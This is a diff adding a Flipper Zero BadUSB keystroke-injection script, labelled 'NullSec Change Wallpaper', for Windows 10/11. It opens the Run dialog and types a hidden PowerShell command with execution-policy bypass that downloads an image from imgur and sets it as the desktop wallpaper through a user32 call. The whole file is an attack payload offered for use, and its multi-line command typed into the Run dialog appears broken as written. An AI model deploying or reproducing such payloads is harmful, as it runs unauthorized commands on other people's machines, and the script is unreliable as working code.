@@ -1,0 +1,14 @@
+REM ========================================
+REM NullSec Flipper Zero BadUSB
+REM Payload: Change Wallpaper
+REM Target: Windows 10/11
+REM ========================================
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -w hidden -ep bypass -c "Invoke-WebRequest 'https://i.imgur.com/FJYwR6P.jpg' -OutFile '$env:TEMP\wp.jpg';Add-Type @'
+ENTER
+STRING using System.Runtime.InteropServices; public class W{[DllImport(\"user32.dll\",CharSet=CharSet.Auto)]public static extern int SystemParametersInfo(int a,int b,string c,int d);}
+ENTER
+STRING '@;[W]::SystemParametersInfo(20,0,\"$env:TEMP\wp.jpg\",3)"
+ENTER
